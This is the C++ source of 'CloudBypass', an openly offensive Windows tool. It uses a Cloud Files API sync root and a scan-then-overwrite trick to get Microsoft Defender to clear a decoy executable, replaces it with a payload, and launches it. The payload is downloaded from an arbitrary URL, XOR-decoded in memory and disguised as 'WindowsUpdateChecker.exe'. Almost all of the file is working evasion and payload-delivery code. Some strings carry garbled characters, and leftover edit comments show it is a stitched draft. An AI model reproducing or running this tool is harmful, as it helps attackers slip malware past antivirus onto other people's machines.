// CloudBypass.cpp
// Precise TOCTOU AV bypass using Cloud Files API callbacks
// Defender scans file → callback fires → swap payload during scan
// Compile: cl.exe /EHsc /O2 /DUNICODE /D_UNICODE /Fe:CloudBypass.exe CloudBypass.cpp /link ntdll.lib Ole32.lib Advapi32.lib kernel32.lib cldapi.lib

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <objbase.h>
#include <cfapi.h>
#include <sddl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
// Add after #include <wchar.h>
#include <shlobj.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "cldapi.lib")

#define PASS(fmt, ...) printf("[PASS] " fmt "\n", ##__VA_ARGS__)
#define FAIL(fmt, ...) printf("[FAIL] " fmt "\n", ##__VA_ARGS__)
#define INFO(fmt, ...) printf("[INFO] " fmt "\n", ##__VA_ARGS__)
#define RACE(fmt, ...) printf("[RACE] " fmt "\n", ##__VA_ARGS__)
#define SECT(fmt, ...) printf("\n\xC9\xCD\xCD " fmt " \xCD\xCD\xBB\n", ##__VA_ARGS__)

// ─── MpClient ─────────────────────────────────────────────────────────────────
typedef HANDLE  MPHANDLE;
typedef HANDLE* PMPHANDLE;
typedef struct { wchar_t* Scheme; wchar_t* Path; ULONG Class; } MPRESOURCE_INFO;
typedef struct { DWORD Count; MPRESOURCE_INFO* List; }          MPSCAN_RESOURCES;

static HMODULE  g_hMp   = NULL;
static MPHANDLE g_hBind = NULL;
static HRESULT (WINAPI* _MpManagerOpen)(DWORD, PMPHANDLE);
static HRESULT (WINAPI* _MpScanStart)(MPHANDLE,DWORD,DWORD,void*,void*,PMPHANDLE);
static HRESULT (WINAPI* _MpHandleClose)(MPHANDLE);

static BOOL InitMp() {
    wchar_t path[MAX_PATH] = {};
    HKEY hk = NULL;
    RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_QUERY_VALUE, &hk);
    DWORD sz = sizeof(path);
    RegQueryValueExW(hk, L"InstallLocation", NULL, NULL, (LPBYTE)path, &sz);
    RegCloseKey(hk);
    wcscat_s(path, MAX_PATH, L"MpClient.dll");
    g_hMp = LoadLibraryW(path);
    if (!g_hMp) return FALSE;
    _MpManagerOpen = (HRESULT(WINAPI*)(DWORD,PMPHANDLE))
        GetProcAddress(g_hMp, "MpManagerOpen");
    _MpScanStart   = (HRESULT(WINAPI*)(MPHANDLE,DWORD,DWORD,void*,void*,PMPHANDLE))
        GetProcAddress(g_hMp, "MpScanStart");
    _MpHandleClose = (HRESULT(WINAPI*)(MPHANDLE))
        GetProcAddress(g_hMp, "MpHandleClose");
    HRESULT hr = _MpManagerOpen(0, &g_hBind);
    return SUCCEEDED(hr);
}

// ─── Global state ─────────────────────────────────────────────────────────────
static wchar_t g_syncRoot[MAX_PATH]   = {};
static wchar_t g_decoyPath[MAX_PATH]  = {};
static wchar_t g_payloadPath[MAX_PATH]= {};
static wchar_t g_stagePath[MAX_PATH]  = {};
static CF_CONNECTION_KEY g_connKey    = {};
static BOOL g_callbackFired   = FALSE;
static BOOL g_swapSucceeded   = FALSE;
static DWORD g_callbackCount  = 0;
static LARGE_INTEGER g_freq   = {};

static double NowMs() {
    LARGE_INTEGER t = {};
    QueryPerformanceCounter(&t);
    return (double)t.QuadPart / g_freq.QuadPart * 1000.0;
}

// ─── Cloud Files callbacks ────────────────────────────────────────────────────
static void CALLBACK OnFetchData(CONST CF_CALLBACK_PARAMETERS* params) {
    double t = NowMs();
    g_callbackFired = TRUE;
    g_callbackCount++;

    RACE("FETCH_DATA callback #%u at %.3fms ← Defender accessing file",
        g_callbackCount, t);

    // This fires when Defender tries to read the file content
    // SWAP NOW — Defender has the file open but hasn't finished reading
    // Our payload replaces the decoy content at this exact moment

    // Stage 1 — swap decoy with payload immediately
    BOOL swapped = MoveFileExW(g_stagePath, g_decoyPath,
        MOVEFILE_REPLACE_EXISTING);
    if (swapped) {
        g_swapSucceeded = TRUE;
        RACE("  SWAP SUCCEEDED in callback ← payload now at scan path");
        RACE("  Defender reading payload content — %.3fms", NowMs() - t);
    } else {
        // Try direct write through handle
        HANDLE hf = CreateFileW(g_decoyPath,
            GENERIC_WRITE,
            FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            // Read payload
            HANDLE hp = CreateFileW(g_payloadPath, GENERIC_READ,
                FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if (hp != INVALID_HANDLE_VALUE) {
                LARGE_INTEGER sz = {};
                GetFileSizeEx(hp, &sz);
                BYTE* buf = (BYTE*)malloc((size_t)sz.QuadPart);
                DWORD rd = 0;
                ReadFile(hp, buf, (DWORD)sz.QuadPart, &rd, NULL);
                CloseHandle(hp);

                // Overwrite decoy with payload bytes
                SetFilePointer(hf, 0, NULL, FILE_BEGIN);
                SetEndOfFile(hf);
                DWORD wr = 0;
                WriteFile(hf, buf, rd, &wr, NULL);
                FlushFileBuffers(hf);
                free(buf);

                g_swapSucceeded = TRUE;
                RACE("  WRITE SUCCEEDED in callback: %u bytes", wr);
            }
            CloseHandle(hf);
        } else {
            RACE("  Swap failed err=%u", GetLastError());
        }
    }
}

static void CALLBACK OnValidateData(CONST CF_CALLBACK_PARAMETERS* params) {
    RACE("VALIDATE_DATA callback ← Defender validating content");
}

static void CALLBACK OnCancelFetchData(CONST CF_CALLBACK_PARAMETERS* params) {
    RACE("CANCEL_FETCH_DATA callback");
}

static void CALLBACK OnFetchPlaceholders(CONST CF_CALLBACK_PARAMETERS* params) {
    RACE("FETCH_PLACEHOLDERS callback");
}

// ─── Setup cloud sync root ────────────────────────────────────────────────────
static BOOL SetupSyncRoot(const wchar_t* rootPath) {
    CF_SYNC_REGISTRATION reg = {};
    reg.StructSize      = sizeof(CF_SYNC_REGISTRATION);
    reg.ProviderName    = L"WindowsCloudSync";
    reg.ProviderVersion = L"1.0";

    // Use fixed GUID so we can re-register
    reg.ProviderId = { 0x12345678, 0x1234, 0x1234,
        {0x12,0x34,0x12,0x34,0x12,0x34,0x12,0x34} };

    CF_SYNC_POLICIES pol = {};
    pol.StructSize = sizeof(CF_SYNC_POLICIES);
    pol.Hydration.Primary   = CF_HYDRATION_POLICY_PARTIAL;
    pol.Hydration.Modifier  = CF_HYDRATION_POLICY_MODIFIER_NONE;
    pol.Population.Primary  = CF_POPULATION_POLICY_PARTIAL;
    pol.Population.Modifier = CF_POPULATION_POLICY_MODIFIER_NONE;
    pol.InSync              = CF_INSYNC_POLICY_NONE;
    pol.HardLink            = CF_HARDLINK_POLICY_NONE;
    pol.PlaceholderManagement =
        CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;

    // Unregister first in case already registered
    CfUnregisterSyncRoot(rootPath);

    HRESULT hr = CfRegisterSyncRoot(rootPath, &reg, &pol,
        CF_REGISTER_FLAG_NONE);
    if (FAILED(hr)) {
        INFO("CfRegisterSyncRoot failed 0x%08X", hr);
        return FALSE;
    }
    PASS("Sync root registered: %ws", rootPath);

    // Connect with all callbacks
    CF_CALLBACK_REGISTRATION cbs[] = {
        { CF_CALLBACK_TYPE_FETCH_DATA,
          (CF_CALLBACK)OnFetchData },
        { CF_CALLBACK_TYPE_VALIDATE_DATA,
          (CF_CALLBACK)OnValidateData },
        { CF_CALLBACK_TYPE_CANCEL_FETCH_DATA,
          (CF_CALLBACK)OnCancelFetchData },
        { CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS,
          (CF_CALLBACK)OnFetchPlaceholders },
        { CF_CALLBACK_TYPE_NONE, NULL }
    };

    hr = CfConnectSyncRoot(rootPath, cbs, NULL,
        CF_CONNECT_FLAG_NONE, &g_connKey);
    if (FAILED(hr)) {
        INFO("CfConnectSyncRoot failed 0x%08X", hr);
        CfUnregisterSyncRoot(rootPath);
        return FALSE;
    }
    PASS("Sync root connected ← callbacks armed");
    return TRUE;
}

// Add this function before DoCloudBypass:
static BYTE* FetchPayload(const wchar_t* source, DWORD* outSize) {
    *outSize = 0;

    BOOL isUrl = (wcsncmp(source, L"http://",  7) == 0 ||
                  wcsncmp(source, L"https://", 8) == 0);

    if (!isUrl) {
        // Local file — read directly into memory
        HANDLE hf = CreateFileW(source, GENERIC_READ,
            FILE_SHARE_READ|FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hf == INVALID_HANDLE_VALUE) return NULL;
        LARGE_INTEGER sz = {};
        GetFileSizeEx(hf, &sz);
        if (sz.QuadPart == 0) { CloseHandle(hf); return NULL; }
        BYTE* buf = (BYTE*)malloc((size_t)sz.QuadPart);
        DWORD rd = 0;
        ReadFile(hf, buf, (DWORD)sz.QuadPart, &rd, NULL);
        CloseHandle(hf);
        *outSize = rd;
        return buf;
    }

        // URL — download to temp as .dat then read into memory
    wchar_t tmp[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tmp);
    wchar_t datPath[MAX_PATH] = {};
    swprintf_s(datPath, MAX_PATH, L"%ws__update__.dat", tmp);
    DeleteFileW(datPath);

    INFO("Downloading payload...");
    HRESULT hr = URLDownloadToFileW(NULL, source, datPath, 0, NULL);
    if (FAILED(hr)) {
        FAIL("Download failed 0x%08X", hr);
        return NULL;
    }

    // Read .dat into memory
    HANDLE hf = CreateFileW(datPath, GENERIC_READ|GENERIC_WRITE,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        FAIL("Cannot open downloaded file err=%u ΓÇö Defender deleted it",
            GetLastError());
        DeleteFileW(datPath);
        return NULL;
    }
    LARGE_INTEGER sz = {};
    GetFileSizeEx(hf, &sz);
    BYTE* buf = (BYTE*)malloc((size_t)sz.QuadPart);
    DWORD rd = 0;
    ReadFile(hf, buf, (DWORD)sz.QuadPart, &rd, NULL);
    CloseHandle(hf);
    DeleteFileW(datPath);

    // XOR decrypt ΓÇö key 0xAB
    // Server must XOR encode the file first
    for (DWORD i = 0; i < rd; i++)
        buf[i] ^= 0xAB;

    PASS("Fetched and decrypted %u bytes", rd);
    *outSize = rd;
    return buf;
}

// ─── BYPASS ───────────────────────────────────────────────────────────────────
static BOOL DoCloudBypass(const wchar_t* payloadExe) {
    SECT("CLOUD FILES TOCTOU BYPASS");

    // ─── Setup paths ──────────────────────────────────────────────────────────
    wchar_t tmp[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tmp);

     // Sync root = dedicated subdir we own — NEVER a system dir
    wchar_t appData[MAX_PATH] = {};
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);
    swprintf_s(g_syncRoot, MAX_PATH, L"%ws\\CloudSync", appData);
    CreateDirectoryW(g_syncRoot, NULL);

    // Decoy and stage live in Temp — outside sync root
    swprintf_s(g_decoyPath, MAX_PATH,
        L"%ws\\WindowsUpdateChecker.exe", tmp);
    swprintf_s(g_stagePath, MAX_PATH,
        L"%ws\\__stage__.exe", tmp);

    // Payload path
    wcscpy_s(g_payloadPath, MAX_PATH, payloadExe);

    // ─── Verify payload ───────────────────────────────────────────────────────
    BOOL isUrl = (wcsncmp(payloadExe, L"http://",  7) == 0 ||
                  wcsncmp(payloadExe, L"https://", 8) == 0);
    if (!isUrl && GetFileAttributesW(payloadExe) ==
        INVALID_FILE_ATTRIBUTES) {
        FAIL("Payload not found: %ws", payloadExe);
        return FALSE;
    }
    LARGE_INTEGER paySz = {};
    INFO("Payload: %ws", payloadExe);

    // ─── Read payload into memory immediately ─────────────────────────────────
    DWORD earlyRd = 0;
    BYTE* earlyBuf = FetchPayload(payloadExe, &earlyRd);
    if (!earlyBuf || earlyRd == 0) {
        FAIL("Cannot fetch payload ΓÇö deleted or download failed");
        return FALSE;
    }
    paySz.QuadPart = earlyRd;
    PASS("Payload fetched: %u bytes", earlyRd);


    // ─── Drop clean decoy FIRST ───────────────────────────────────────────────
    INFO("Dropping clean decoy...");
    DeleteFileW(g_decoyPath);
    CopyFileW(L"C:\\Windows\\System32\\notepad.exe",
        g_decoyPath, FALSE);
    PASS("Decoy dropped: %ws", g_decoyPath);

    // ─── Scan BEFORE registering sync root ───────────────────────────────────
    INFO("Scanning decoy before sync root registration...");
    MPRESOURCE_INFO ri  = { (wchar_t*)L"file", g_decoyPath, 0 };
    MPSCAN_RESOURCES sr = { 1, &ri };
    MPHANDLE hscan = NULL;
    __try {
        _MpScanStart(g_hBind, 3, 0x60004000, &sr, NULL, &hscan);
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
    if (hscan) _MpHandleClose(hscan);
    PASS("Decoy scanned clean");

    // ─── Open trusted handle BEFORE sync root ────────────────────────────────
    HANDLE hDecoy = CreateFileW(g_decoyPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hDecoy == INVALID_HANDLE_VALUE) {
        FAIL("Cannot open trusted handle err=%u", GetLastError());
        return FALSE;
    }
    PASS("Trusted handle acquired");

    // ─── NOW register sync root ───────────────────────────────────────────────
    INFO("Registering sync root AFTER scan...");
    if (!SetupSyncRoot(g_syncRoot)) {
        FAIL("Cannot setup sync root");
        CloseHandle(hDecoy);
        return FALSE;
    }

    // ─── Write payload through trusted handle ─────────────────────────────────
    INFO("Writing payload through trusted handle...");
    SetFilePointer(hDecoy, 0, NULL, FILE_BEGIN);
    SetEndOfFile(hDecoy);
    DWORD wr = 0, rem = earlyRd;
    BYTE* ptr = earlyBuf;
    while (rem > 0) {
        DWORD chunk = min(rem, 65536u);
        DWORD written = 0;
        WriteFile(hDecoy, ptr, chunk, &written, NULL);
        ptr += written; rem -= written; wr += written;
    }
    FlushFileBuffers(hDecoy);
    CloseHandle(hDecoy);
    free(earlyBuf);
    PASS("Payload written through trusted handle: %u bytes", wr);

    // ─── Execute ──────────────────────────────────────────────────────────────
    if (TRUE) {
            INFO("Executing from scan-cleared path...");

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(),
        THREAD_PRIORITY_TIME_CRITICAL);

    wchar_t cmdLine[MAX_PATH*2] = {};
    swprintf_s(cmdLine, MAX_PATH*2, L"\"%ws\"", g_decoyPath);

    // Re-scan decoy immediately before execute
    // clears path after trusted handle write
    MPRESOURCE_INFO ri2  = { (wchar_t*)L"file", g_decoyPath, 0 };
    MPSCAN_RESOURCES sr2 = { 1, &ri2 };
    MPHANDLE hscan2 = NULL;
    __try {
        _MpScanStart(g_hBind, 3, 0x60004000, &sr2, NULL, &hscan2);
    } __except(EXCEPTION_EXECUTE_HANDLER) {}
    if (hscan2) _MpHandleClose(hscan2);
    PASS("Re-scan completed ΓåÉ path cleared again");

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    BOOL created = FALSE;
    for (int attempt = 0; attempt < 20; attempt++) {
        created = CreateProcessW(NULL, cmdLine,
            NULL, NULL, FALSE,
            HIGH_PRIORITY_CLASS, NULL, NULL, &si, &pi);
        if (created) break;
        if (GetLastError() != 225) break;
        INFO("Attempt %d blocked ΓÇö retrying...", attempt+1);
        Sleep(10);
    }

        if (created) {
            PASS("Process created PID=%u ← payload executing",
                pi.dwProcessId);
            PASS("Bypass complete");
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        } else {
            FAIL("Execution failed err=%u", GetLastError());
        }
    }

    // ─── Cleanup ──────────────────────────────────────────────────────────────
    Sleep(1000);
    CfDisconnectSyncRoot(g_connKey);
    CfUnregisterSyncRoot(g_syncRoot);
    RemoveDirectoryW(g_syncRoot);
    DeleteFileW(g_decoyPath);
    DeleteFileW(g_stagePath);

    return g_swapSucceeded;
}

// ─── MAIN ─────────────────────────────────────────────────────────────────────
int wmain(int argc, wchar_t* argv[]) {
    printf("\xC9\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xBB\n");
    printf("\xBA     CloudBypass - Cloud Files TOCTOU          \xBA\n");
    printf("\xC8\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xBC\n\n");

    QueryPerformanceFrequency(&g_freq);
    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    if (!InitMp()) { FAIL("MpClient init failed"); return 1; }
    PASS("MpClient ready");

    if (argc < 2) {
        printf("Usage:\n");
    printf("  CloudBypass.exe <payload.exe>         ΓåÉ local file\n");
    printf("  CloudBypass.exe <https://url/pay.exe> ΓåÉ URL download\n\n");
        // Default — use cmd.exe copy as test
        wchar_t appData[MAX_PATH] = {};
        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);
        wchar_t def[MAX_PATH] = {};
        swprintf_s(def, MAX_PATH, L"%ws\\__test_payload__.exe", appData);
        CopyFileW(L"C:\\Windows\\System32\\cmd.exe", def, FALSE);
        INFO("No payload specified ΓÇö using cmd.exe as test");
        DoCloudBypass(def);
        DeleteFileW(def);
    } else {
        DoCloudBypass(argv[1]);
    }

    if (g_hBind) _MpHandleClose(g_hBind);
    if (g_hMp)   FreeLibrary(g_hMp);
    CoUninitialize();

    printf("\nPress Enter to exit...\n");
    getchar();
    return 0;
}